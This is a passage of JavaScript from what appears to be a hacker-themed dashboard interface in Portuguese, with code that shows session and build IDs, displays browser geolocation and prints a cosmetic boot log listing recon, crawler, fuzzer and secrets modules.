  const build = 'BF' + Math.floor(Math.random()*9999).toString(16).toUpperCase() + '-' + Math.floor(Math.random()*9999).toString(16).toUpperCase();
  document.getElementById('session-id').textContent = sid;
  document.getElementById('ftr-session').textContent = sid;
  document.getElementById('build-ref').textContent = build;
}

function initGeo() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(pos => {
      document.getElementById('geo-lat').textContent = `LAT: ${pos.coords.latitude.toFixed(4)}° N`;
      document.getElementById('geo-lng').textContent = `LNG: ${pos.coords.longitude.toFixed(4)}° W`;
      log(`GEO_SYNC: Localização obtida.`, 'success', 'GEO');
    }, () => {
      document.getElementById('geo-lat').textContent = 'LAT: BLOCKED';
      document.getElementById('geo-lng').textContent = 'LNG: BLOCKED';
    });
  }
}

// ---- INIT ----
window.addEventListener('DOMContentLoaded', () => {
  loadLogs();
  renderAllLogs();
  initCoreGrid();
  initRawStream();
  initStats();
  initSession();
  initGeo();

  // Boot sequence
  const boot = [
    ['SYSTEM BOOT...', 'info'],
    ['CARREGANDO MÓDULOS DE INTELIGÊNCIA...', 'info'],
    ['MODULE_01 RECON: ONLINE', 'success'],
    ['MODULE_03 CRAWLER: ONLINE', 'success'],
    ['MODULE_04 FUZZER: ONLINE', 'success'],
    ['MODULE_05 SECRETS: ONLINE', 'success'],
    ['MODULE_06 REPORT: ONLINE', 'success'],
    ['MODULE_07 HEADERS: ONLINE', 'success'],
    ['TODOS OS SISTEMAS OPERACIONAIS. BEM-VINDO, JOSYEL.', 'success'],
  ];
  boot.forEach((b, i) => setTimeout(() => log(b[0], b[1], 'BOOT'), i * 250));
});
